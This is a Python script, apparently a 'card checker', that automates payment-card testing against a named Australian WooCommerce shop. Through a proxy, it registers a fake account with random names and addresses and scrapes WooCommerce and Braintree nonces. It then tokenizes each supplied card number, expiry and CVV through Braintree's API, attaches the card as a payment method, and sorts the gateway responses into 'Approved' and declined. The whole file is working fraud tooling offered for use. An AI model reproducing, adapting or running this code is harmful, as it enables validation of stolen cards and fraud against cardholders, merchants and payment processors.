import aiohttp
import certifi
import ssl
import random
import json
import base64
from bs4 import BeautifulSoup
import re
import asyncio
import names
import random_address

genaddr = random_address.real_random_address()
address = genaddr['address1']
try: 
    City = genaddr['city']
except KeyError:
    City = "FL"
State = genaddr['state']
Zip_Code = genaddr['postalCode']

async def ZarekCHK(cc, proxyrand):
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)
    timeout = aiohttp.ClientTimeout(total=20)
    async with aiohttp.ClientSession(connector=conn) as session:
        splitter = cc.split('|')
        ccnum    = splitter[0]
        mes      = splitter[1]
        ano      = splitter[2]
        cvv      = splitter[3] 
        try:
            #---------------------------------REQUEST NUMERO 1---------------   ---------------#
            #---------------------------------REQUEST NUMERO 1---------------   ---------------#        
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
                # 'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
            })
            async with session.get(url='https://www.forestsuperfoods.com.au/my-account/', proxy=str(proxyrand), timeout=22) as resp:
                try :          
                    response = await resp.text()
                    soup = BeautifulSoup(response , 'lxml')
                    noncewoo = soup.find_all("input", {"name": "woocommerce-register-nonce"})[0]["value"]
                except (UnboundLocalError):
                    
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️'
                except (IndexError):
                    
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️'
                except (KeyError):
                    
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 2---------------   ---------------#
            #---------------------------------REQUEST NUMERO 2---------------   ---------------# 
            CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000,9999)}@gmail.com"
   
            data = {
                'email': CorreoRand,
                'woocommerce-register-nonce': noncewoo,
                '_wp_http_referer': '/my-account/',
                'register': 'Register',
            }
            async with session.post('https://www.forestsuperfoods.com.au/my-account', data=data, proxy=str(proxyrand), timeout=22) as resp:
                try :          
                    response = await resp.text()
                except (UnboundLocalError):
                    
                    return 'An unexpected error occurred in request 02. It was not generated correctly. ♻️'
                except (TypeError):
                    
                    return 'An unexpected error occurred in request 02. It was not generated correctly. ♻️'
                except (KeyError):
                    
                    return 'An unexpected error occurred in request 02. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 4---------------   ---------------#
            #---------------------------------REQUEST NUMERO 4---------------   ---------------#
            async with session.get('https://www.forestsuperfoods.com.au/my-account/edit-address/billing', proxy=str(proxyrand), timeout=22) as resp:
                try :
                    response = await resp.text()
                    soup = BeautifulSoup(response , 'lxml')
                    addressnonce = soup.find("input", {"name": "woocommerce-edit-address-nonce"})["value"]    
                except (UnboundLocalError):
                    
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️'
                except (TypeError):
                    
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️'
                except (KeyError):
                    
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 3---------------   ---------------#
            #---------------------------------REQUEST NUMERO 3---------------   ---------------#
            data = {
                'billing_first_name': names.get_first_name(),
                'billing_last_name': names.get_last_name(),
                'billing_company': '',
                'billing_country': 'US',
                'billing_address_1': address,
                'billing_address_2': '',
                'billing_city': City,
                'billing_state': State,
                'billing_postcode': Zip_Code,
                'billing_phone': f'7{random.randint(100,999)}{random.randint(100,999)}{random.randint(100,999)}',
                'billing_email': CorreoRand,
                'save_address': 'Save address',
                'woocommerce-edit-address-nonce': addressnonce,
                '_wp_http_referer': '/my-account/edit-address/billing',
                'action': 'edit_address',
            }
            async with session.post('https://www.forestsuperfoods.com.au/my-account/edit-address/billing', data=data, proxy=str(proxyrand), timeout=22) as resp:
                try :
                        response = await resp.text()
                except (UnboundLocalError):
                    
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️'
                except (TypeError):
                    
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️'
                except (KeyError):
                    
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 5---------------   ---------------#
            #---------------------------------REQUEST NUMERO 5---------------   ---------------#
            async with session.get('https://www.forestsuperfoods.com.au/my-account/add-payment-method/', proxy=str(proxyrand), timeout=22) as resp:
                try :
                    response = await resp.text()
                    soup = BeautifulSoup(response , 'lxml')
                    noncewoo2 = soup.find("input", {"name": "woocommerce-add-payment-method-nonce"})["value"]    
                    lines = response.split("\n")
                    for i in lines:
                        if "window.wc_braintree_credit_card_payment_form_handler" in i:
                            sucio = i
                            sucio = sucio.replace('			window.wc_braintree_credit_card_payment_form_handler = new WC_Braintree_Credit_Card_Payment_Form_Handler( ',"").replace(' );window.jQuery( document.body ).trigger( "update_checkout" );		}',"")
                            bearer = json.loads(sucio)
                            bearer = bearer['client_token_nonce']
                except (UnboundLocalError):
                    
                    return 'An unexpected error occurred in request 05. It was not generated correctly. ♻️'
                except (TypeError):
                    
                    return 'An unexpected error occurred in request 05. It was not generated correctly. ♻️'
                except (KeyError):
                    
                    return 'An unexpected error occurred in request 05. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 6---------------   ---------------#
            #---------------------------------REQUEST NUMERO 6---------------   ---------------#

            data = {
                'action': 'wc_braintree_credit_card_get_client_token',
                'nonce': bearer,
            }
            async with session.post('https://www.forestsuperfoods.com.au/wp-admin/admin-ajax.php', data=data, proxy=str(proxyrand), timeout=22) as resp:
                try :
                    response = await resp.json()
                    bearer = json.loads(base64.b64decode(response['data']))
                    bearer = bearer['authorizationFingerprint']
                except (UnboundLocalError):
                    
                    return 'An unexpected error occurred in request 06. It was not generated correctly. ♻️'
                except (TypeError):
                    
                    return 'An unexpected error occurred in request 06. It was not generated correctly. ♻️'
                except (KeyError):
                    
                    return 'An unexpected error occurred in request 06. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 7---------------   ---------------#
            #---------------------------------REQUEST NUMERO 7---------------   ---------------#

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
                'Accept': '*/*',
                'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                'Content-Type': 'application/json',
                'Authorization': f'Bearer {bearer}',
                'Braintree-Version': '2018-05-10',
                'Origin': 'https://assets.braintreegateway.com',
                'Connection': 'keep-alive',
                'Referer': 'https://assets.braintreegateway.com/',
            }

            data = {

                "clientSdkMetadata":{
                    "source":"client",
                    "integration":"custom",
                    "sessionId":"5b65142d-43de-4a5b-a677-84203fd2a241"
                },
                "query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
                "variables":{
                    "input":{
                        "creditCard":{
                            "number": ccnum,
                            "expirationMonth": mes,
                            "expirationYear": ano,
                            "cvv": cvv
                        },
                        "options":{
                            "validate":False
                        }
                    }
                },
                "operationName":"TokenizeCreditCard"

            }
            async with session.post('https://payments.braintree-api.com/graphql', headers=headers, proxy=str(proxyrand),json=data, timeout=12) as resp:
                try :        
                    token = await resp.json()
                    token = token['data']['tokenizeCreditCard']['token'] 
                except (UnboundLocalError):
                    
                    return 'An unexpected error occurred in request 07. It was not generated correctly. ♻️'
                except (TypeError):
                    
                    return 'An unexpected error occurred in request 07. It was not generated correctly. ♻️'
                except (KeyError):
                    
                    return 'An unexpected error occurred in request 07. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 5---------------   ---------------#
            #---------------------------------REQUEST NUMERO 5---------------   ---------------#
            data = [
                ('payment_method', 'braintree_credit_card'),
                ('wc-braintree-credit-card-card-type', 'visa'),
                ('wc-braintree-credit-card-3d-secure-enabled', ''),
                ('wc-braintree-credit-card-3d-secure-verified', ''),
                ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
                ('wc_braintree_credit_card_payment_nonce', token),
                ('wc_braintree_device_data', '{"correlation_id":"ba7325e206c981d19fdd63b5ba6fedb0"}'),
                ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
                ('wc_braintree_paypal_payment_nonce', ''),
                ('wc_braintree_device_data', '{"correlation_id":"ba7325e206c981d19fdd63b5ba6fedb0"}'),
                ('wc_braintree_paypal_amount', '0.00'),
                ('wc_braintree_paypal_currency', 'AUD'),
                ('wc_braintree_paypal_locale', 'en_au'),
                ('wc-braintree-paypal-tokenize-payment-method', 'true'),
                ('woocommerce-add-payment-method-nonce', noncewoo2),
                ('_wp_http_referer', '/my-account/add-payment-method/'),
                ('woocommerce_add_payment_method', '1'),
            ]
            async with session.post('https://www.forestsuperfoods.com.au/my-account/add-payment-method/', data=data, proxy=str(proxyrand), timeout=22) as resp:
                try :
                    response = await resp.text()
                except (UnboundLocalError):
                    
                    return 'An unexpected error occurred in request 08. It was not generated correctly. ♻️'
                except (TypeError):
                    
                    return 'An unexpected error occurred in request 08. It was not generated correctly. ♻️'
                except (KeyError):
                    
                    return 'An unexpected error occurred in request 08. It was not generated correctly. ♻️'
            #---------------------------------REQUEST CHECKS---------------   ---------------#
            #---------------------------------REQUEST CHECKS---------------   ---------------#
            if int(response.find('New payment method added')) > 0 :
                
                return "Approved", "1000 Approved"
            elif int(response.find('Status code 1000: Approved')) > 0 :
                
                return "Approved", "1000 Approved" 
            elif int(response.find('Status code 2001: Insufficient Funds')) > 0 :
                
                return "Approved", "2001 Insufficient Funds"
            elif (int(response.find('Status code cvv:')) > 0):
                
                return "Approved", "Gateway Rejected: cvv"
            elif (int(response.find('Status code avs: Gateway Rejected: avs')) > 0):
                
                return "Approved", "Gateway Rejected: avs"
            elif (int(response.find('Status code avs_and_cvv:')) > 0):
                
                return "Approved", "Gateway Rejected: avs_and_cvv"
            elif int(response.find('Status code 2010: Card Issuer Declined CVV')) > 0 :
                
                return "Approved", "2010 Card Issuer Declined CVV"
            elif int(response.find('Status code risk_threshold:')) > 0 :
                
                return "Gateway Rejected: risk_threshold"
            elif int(response.find('Processor Network Unavailable')) > 0 :
                
                return "Processor Network Unavailable - Try Again"
            elif int(response.find('Duplicate card exists in the vault.')) > 0 :
                
                return "This card is already registered"
            elif int(response.find('Status code')) > 0 :
                #							<li><div class="message-container container"><span class="message-icon icon-close"></span> Status code 2038: Processor Declined</div></li>
                lines = response.split("\n")
                for i in lines:
                    if 'Status code ' in i:
                        sucio = i
                        Message = sucio.replace(f'\t\t\t\tStatus code ',"").replace("\t\t\t</div>","").replace(": "," ")
                
                return Message
            else :
                
                print("Error in /od")
                return "An unexpected error occurred in response. It was not generated correctly. ⚠️"
        except (aiohttp.client_exceptions.ServerDisconnectedError):
            return "An unexpected error occurred. Timeout Error. ♻️"
        except (asyncio.exceptions.TimeoutError):
            return "An unexpected error occurred. Timeout Error. ♻️"
        except (aiohttp.client_exceptions.ClientConnectorError):
            return "An unexpected error occurred. Timeout Error. ♻️"
        finally:
            await session.close()